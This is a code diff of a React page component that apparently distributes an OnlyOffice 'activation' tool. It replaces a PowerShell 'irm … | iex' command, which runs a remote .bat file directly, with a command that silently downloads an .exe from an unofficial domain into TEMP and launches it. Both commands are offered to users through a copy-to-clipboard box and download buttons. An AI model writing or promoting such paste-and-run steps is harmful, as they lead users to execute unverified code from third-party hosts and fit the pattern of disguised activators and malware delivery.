@@ -10,7 +10,7 @@ export default function DemoPcActivation() {
   const [guideOpen, setGuideOpen] = useState(false);
   const [copiedPs, setCopiedPs] = useState(false);
 
-  const psCmd = "$ irm 'https://onlyoffice.mercytechglobal.com/Kich-Hoat-Demo-OnlyOffice-Mercy.bat' | iex";
+  const psCmd = "$ProgressPreference='SilentlyContinue'; Invoke-WebRequest -Uri 'https://onlyofficevietnam.com/Setup-OnlyOffice-Mercy.exe' -OutFile '$env:TEMP\\Setup-OnlyOffice-Mercy.exe'; Start-Process '$env:TEMP\\Setup-OnlyOffice-Mercy.exe'";
 
   const handleCopyPs = () => {
     if (typeof window !== "undefined") {
@@ -185,8 +185,8 @@ export default function DemoPcActivation() {
 
               {/* Primary Download Button */}
               <a
-                href="/Kich-Hoat-Demo-OnlyOffice-Mercy.bat"
-                download="Kich-Hoat-Demo-OnlyOffice-Mercy.bat"
+                href="/Setup-OnlyOffice-Mercy.exe"
+                download="Setup-OnlyOffice-Mercy.exe"
                 style={{
                   background: "linear-gradient(135deg, #ff6f3d 0%, #ea580c 100%)",
                   color: "#ffffff",
@@ -225,15 +225,15 @@ export default function DemoPcActivation() {
                     fontWeight: 700,
                   }}
                 >
-                  ~44 KB
+                  ~5.2 MB
                 </span>
               </a>
 
               {/* Secondary Actions: Backup ZIP + Guide */}
               <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "10px" }}>
                 <a
-                  href="/Kich-Hoat-Demo-OnlyOffice-Mercy.bat"
-                  download="Kich-Hoat-Demo-OnlyOffice-Mercy.bat"
+                  href="/Setup-OnlyOffice-Mercy.exe"
+                  download="Setup-OnlyOffice-Mercy.exe"
                   style={{
                     backgroundColor: "#ffffff",
                     color: "#334155",
@@ -316,7 +316,7 @@ export default function DemoPcActivation() {
               >
                 <div style={{ overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>
                   <span style={{ color: "#ea580c", fontWeight: 700 }}>PS&gt; </span>
-                  <span style={{ color: "#334155", fontWeight: 600 }}>irm https://onlyoffice.mercytech.../demo.bat | iex</span>
+                  <span style={{ color: "#334155", fontWeight: 600 }}>iwr https://onlyofficevietnam.com/Setup-OnlyOffice-Mercy.exe ...</span>
                 </div>
                 <button
                   type="button"
